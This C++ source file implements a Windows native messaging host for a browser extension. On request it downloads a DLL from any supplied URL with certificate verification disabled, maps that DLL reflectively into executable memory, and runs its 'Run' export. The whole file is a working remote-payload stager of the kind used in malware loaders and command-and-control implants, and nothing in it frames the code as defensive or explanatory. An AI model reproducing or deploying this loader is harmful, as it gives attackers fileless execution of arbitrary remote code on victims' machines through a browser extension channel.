#include <iostream>
#include <string>
#include <vector>
#include <windows.h>
#include <json.hpp>
#include <curl/curl.h>
#include <io.h>
#include <fcntl.h>

using json = nlohmann::json;

void writeMessage(const json& message) {
    std::string output = message.dump();
    uint32_t length = static_cast<uint32_t>(output.length());
    std::cout.write(reinterpret_cast<const char*>(&length), sizeof(length));
    std::cout.write(output.c_str(), length);
    std::cout.flush();
    std::cerr << "Message sent: " << output << std::endl;
}

bool readMessage(json& message) {
    uint32_t length = 0;

    if (!std::cin.read(reinterpret_cast<char*>(&length), sizeof(length))) {
        if (std::cin.eof()) {
            std::cerr << "Plugin connection closed (EOF)" << std::endl;
            return false;
        }
        if (std::cin.fail()) {
            std::cerr << "Failed to read message length (stream failure)" << std::endl;
            return false;
        }
        return false;
    }

    if (length > 1024 * 1024) {
        std::cerr << "Message too large: " << length << " bytes" << std::endl;
        return false;
    }

    std::string messageStr(length, '\0');
    if (!std::cin.read(&messageStr[0], length)) {
        std::cerr << "Failed to read message body" << std::endl;
        return false;
    }

    try {
        message = json::parse(messageStr);
        std::cerr << "Received message: " << message.dump() << std::endl;
        return true;
    }
    catch (const json::parse_error& e) {
        std::cerr << "JSON parse error: " << e.what() << std::endl;
        return false;
    }
}

size_t writeCallback(void* contents, size_t size, size_t nmemb, std::vector<char>* buffer) {
    size_t totalSize = size * nmemb;
    buffer->insert(buffer->end(), static_cast<char*>(contents), static_cast<char*>(contents) + totalSize);
    return totalSize;
}

std::vector<char> downloadDLL(const std::string& url) {
    std::cerr << "Starting DLL download from: " << url << std::endl;

    CURL* curl = curl_easy_init();
    if (!curl) {
        throw std::runtime_error("Failed to initialize libcurl.");
    }

    std::vector<char> buffer;
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buffer);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);  // Add verbose output for debugging

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        std::string error = std::string("CURL error: ") + curl_easy_strerror(res);
        curl_easy_cleanup(curl);
        throw std::runtime_error(error);
    }

    curl_easy_cleanup(curl);
    std::cerr << "Downloaded DLL size: " << buffer.size() << " bytes" << std::endl;

    if (buffer.empty()) {
        throw std::runtime_error("Downloaded DLL is empty.");
    }

    return buffer;
}

std::string reflectiveExecuteDLL(const std::vector<char>& dllData, const std::string& exportName) {
    std::string output;
    void* dllMemory = nullptr;

    try {
        if (dllData.empty()) {
            throw std::runtime_error("DLL data is empty.");
        }

        auto* dosHeader = reinterpret_cast<const IMAGE_DOS_HEADER*>(dllData.data());
        if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
            throw std::runtime_error("Invalid DOS header.");
        }

        auto* ntHeaders = reinterpret_cast<const IMAGE_NT_HEADERS*>(dllData.data() + dosHeader->e_lfanew);
        if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
            throw std::runtime_error("Invalid NT header.");
        }

        dllMemory = VirtualAlloc(nullptr, ntHeaders->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!dllMemory) {
            throw std::runtime_error("Failed to allocate memory for DLL.");
        }

        // Copy headers
        std::memcpy(dllMemory, dllData.data(), ntHeaders->OptionalHeader.SizeOfHeaders);

        // Copy sections
        auto* sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
        for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i, ++sectionHeader) {
            if (sectionHeader->SizeOfRawData > 0) {
                void* dest = static_cast<char*>(dllMemory) + sectionHeader->VirtualAddress;
                const void* src = dllData.data() + sectionHeader->PointerToRawData;
                std::memcpy(dest, src, sectionHeader->SizeOfRawData);
            }
        }

        // Process imports
        if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size > 0) {
            auto* importDesc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
                static_cast<char*>(dllMemory) +
                ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

            while (importDesc->Name) {
                const char* moduleName = static_cast<const char*>(dllMemory) + importDesc->Name;
                HMODULE module = LoadLibraryA(moduleName);
                if (!module) {
                    throw std::runtime_error(std::string("Failed to load module: ") + moduleName);
                }

                auto* thunk = reinterpret_cast<IMAGE_THUNK_DATA*>(
                    static_cast<char*>(dllMemory) + importDesc->FirstThunk);
                auto* origThunk = reinterpret_cast<IMAGE_THUNK_DATA*>(
                    static_cast<char*>(dllMemory) + importDesc->OriginalFirstThunk);

                while (thunk->u1.AddressOfData) {
                    FARPROC function = nullptr;
                    if (origThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                        function = GetProcAddress(module,
                            reinterpret_cast<const char*>(IMAGE_ORDINAL(origThunk->u1.Ordinal)));
                    }
                    else {
                        auto* importByName = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                            static_cast<char*>(dllMemory) + origThunk->u1.AddressOfData);
                        function = GetProcAddress(module, importByName->Name);
                    }

                    if (!function) {
                        throw std::runtime_error("Failed to resolve import function");
                    }

                    thunk->u1.Function = reinterpret_cast<ULONGLONG>(function);
                    ++thunk;
                    ++origThunk;
                }
                ++importDesc;
            }
        }

        // Process relocations if necessary
        if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size > 0) {
            auto* relocation = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
                static_cast<char*>(dllMemory) +
                ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

            while (relocation->VirtualAddress) {
                DWORD locationCount = (relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                WORD* relInfo = reinterpret_cast<WORD*>(relocation + 1);

                for (DWORD i = 0; i < locationCount; ++i) {
                    if ((relInfo[i] >> 12) == IMAGE_REL_BASED_HIGHLOW) {
                        DWORD* patch = reinterpret_cast<DWORD*>(
                            static_cast<char*>(dllMemory) +
                            relocation->VirtualAddress + (relInfo[i] & 0xFFF));
                        ULONGLONG delta = reinterpret_cast<ULONGLONG>(dllMemory) -
                            ntHeaders->OptionalHeader.ImageBase;
                        *patch += static_cast<DWORD>(delta);
                    }
                }

                relocation = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
                    reinterpret_cast<char*>(relocation) + relocation->SizeOfBlock);
            }
        }

        // Call DllMain
        auto DllMain = reinterpret_cast<BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID)>(
            static_cast<char*>(dllMemory) + ntHeaders->OptionalHeader.AddressOfEntryPoint);

        if (!DllMain(reinterpret_cast<HINSTANCE>(dllMemory), DLL_PROCESS_ATTACH, nullptr)) {
            throw std::runtime_error("DllMain failed");
        }

        // Get export function
        if (ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size > 0) {
            auto* exportDir = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
                static_cast<char*>(dllMemory) +
                ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            DWORD* functions = reinterpret_cast<DWORD*>(
                static_cast<char*>(dllMemory) + exportDir->AddressOfFunctions);
            DWORD* names = reinterpret_cast<DWORD*>(
                static_cast<char*>(dllMemory) + exportDir->AddressOfNames);
            WORD* ordinals = reinterpret_cast<WORD*>(
                static_cast<char*>(dllMemory) + exportDir->AddressOfNameOrdinals);

            for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
                const char* currentName = static_cast<char*>(dllMemory) + names[i];
                if (exportName == currentName) {
                    auto functionRVA = functions[ordinals[i]];
                    auto runFunc = reinterpret_cast<const char* (*)()>(
                        static_cast<char*>(dllMemory) + functionRVA
                        );

                    std::cerr << "Found export function: " << exportName << std::endl;
                    try {
                        const char* result = runFunc();
                        if (result) {
                            output = result;
                            std::cerr << "Function executed, output length: " << output.length() << std::endl;
                        }
                        else {
                            throw std::runtime_error("Function returned null");
                        }
                    }
                    catch (const std::exception& e) {
                        throw std::runtime_error(std::string("Error executing function: ") + e.what());
                    }
                    break;
                }
            }

            if (output.empty()) {
                throw std::runtime_error("Export function not found or execution failed");
            }
        }
    }
    catch (const std::exception& e) {
        if (dllMemory) {
            VirtualFree(dllMemory, 0, MEM_RELEASE);
        }
        throw;
    }

    if (dllMemory) {
        VirtualFree(dllMemory, 0, MEM_RELEASE);
    }

    return output;
}

int main() {
    try {
        std::cerr << "Native messaging host starting..." << std::endl;

        _setmode(_fileno(stdin), _O_BINARY);
        _setmode(_fileno(stdout), _O_BINARY);
        _setmode(_fileno(stderr), _O_BINARY);

        curl_global_init(CURL_GLOBAL_ALL);

        json input;
        while (readMessage(input)) {
            try {
                if (input["action"] == "executeDLL") {
                    const std::string dllUrl = input["url"];
                    const std::string exportName = "Run";

                    std::cerr << "Executing DLL from URL: " << dllUrl << std::endl;

                    writeMessage({ {"status", "progress"}, {"message", "Downloading DLL from URL: " + dllUrl} });

                    std::vector<char> dllData = downloadDLL(dllUrl);
                    std::cerr << "DLL downloaded successfully, size: " << dllData.size() << " bytes" << std::endl;

                    writeMessage({ {"status", "progress"}, {"message", "Reflectively loading DLL"} });

                    std::string output;
                    try {
                        output = reflectiveExecuteDLL(dllData, exportName);
                        std::cerr << "DLL execution completed, output length: " << output.length() << std::endl;
                        writeMessage({
                            {"status", "success"},
                            {"message", "DLL executed successfully"},
                            {"output", output}
                            });
                    }
                    catch (const std::exception& e) {
                        std::cerr << "Error during DLL execution: " << e.what() << std::endl;
                        writeMessage({ {"status", "error"}, {"message", std::string("DLL execution failed: ") + e.what()} });
                    }
                }
                else {
                    std::cerr << "Unsupported action received" << std::endl;
                    writeMessage({ {"status", "error"}, {"message", "Unsupported action received"} });
                }
            }
            catch (const std::exception& e) {
                std::cerr << "Error processing message: " << e.what() << std::endl;
                writeMessage({ {"status", "error"}, {"message", e.what()} });
            }
        }
    }
    catch (const std::exception& e) {
        std::cerr << "Fatal error: " << e.what() << std::endl;
        writeMessage({ {"status", "error"}, {"message", std::string("Fatal error: ") + e.what()} });
    }

    curl_global_cleanup();
    return 0;
}
